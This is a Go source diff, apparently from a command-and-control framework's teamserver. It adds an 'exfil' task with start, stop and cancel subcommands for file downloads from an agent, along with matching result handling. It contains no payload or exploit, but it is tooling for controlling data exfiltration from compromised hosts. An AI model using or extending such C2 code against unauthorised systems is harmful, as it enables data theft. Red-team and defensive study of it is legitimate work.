@@ -159,6 +159,30 @@ func CreateTask(agent AgentData, command string, args map[string]any) (TaskData,
 		array = []interface{}{COMMAND_DOWNLOAD, ConvertUTF8toCp(path, agent.ACP)}
 		break
 
+	case "exfil":
+		fid, ok := args["file_id"].(string)
+		if !ok {
+			err = errors.New("parameter 'file_id' must be set")
+			goto RET
+		}
+
+		fileId, err := strconv.ParseInt(fid, 16, 64)
+		if err != nil {
+			goto RET
+		}
+
+		if subcommand == "cancel" {
+			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_CANCELED, int(fileId)}
+		} else if subcommand == "stop" {
+			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_STOPPED, int(fileId)}
+		} else if subcommand == "start" {
+			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_RUNNING, int(fileId)}
+		} else {
+			err = errors.New("subcommand must be 'cancel', 'start' or 'stop'")
+			goto RET
+		}
+		break
+
 	case "pwd":
 		messageInfo = "Task: print working directory"
 		array = []interface{}{COMMAND_PWD}
@@ -231,7 +255,7 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 			if downloadCommand == DOWNLOAD_START {
 				fileSize := packer.ParseInt32()
 				fileName := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
-				task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %08x]", fileName, fileSize, fileId)
+				task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", fileName, fileSize, fileId)
 				task.Completed = false
 				ts.TsDownloadAdd(agentData.Id, fileId, fileName, int(fileSize))
 
@@ -242,14 +266,26 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 				continue
 
 			} else if downloadCommand == DOWNLOAD_FINISH {
-				state := packer.ParseInt8()
-				if state == DOWNLOAD_STATE_FINISHED {
-					task.Message = fmt.Sprintf("File download complete: [fid %08x]", fileId)
-				} else {
-					task.Message = fmt.Sprintf("File download canceled: [fid %08x]", fileId)
-					task.MessageType = MESSAGE_ERROR
-				}
-				ts.TsDownloadFinish(fileId, int(state))
+				task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
+				ts.TsDownloadClose(fileId, DOWNLOAD_STATE_FINISHED)
+			}
+			break
+
+		case COMMAND_EXFIL:
+			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
+			downloadState := packer.ParseInt8()
+
+			if downloadState == DOWNLOAD_STATE_STOPPED {
+				task.Message = fmt.Sprintf("Download '%v' successful stopped", fileId)
+				ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_STOPPED, []byte(""))
+
+			} else if downloadState == DOWNLOAD_STATE_RUNNING {
+				task.Message = fmt.Sprintf("Download '%v' successful resumed", fileId)
+				ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_RUNNING, []byte(""))
+
+			} else if downloadState == DOWNLOAD_STATE_CANCELED {
+				task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
+				ts.TsDownloadClose(fileId, DOWNLOAD_STATE_CANCELED)
 			}
 			break
 
@@ -271,4 +307,16 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 		_ = json.NewEncoder(&taskObject).Encode(task)
 		ts.TsAgentTaskUpdate(agentData.Id, taskObject.Bytes())
 	}
+}
+
+func BrowserDownloadChangeState(fid string, newState int) ([]byte, error) {
+
+	fileId, err := strconv.ParseInt(fid, 16, 64)
+	if err != nil {
+		return nil, err
+	}
+
+	array := []interface{}{COMMAND_EXFIL, newState, int(fileId)}
+
+	return PackArray(array)
 }
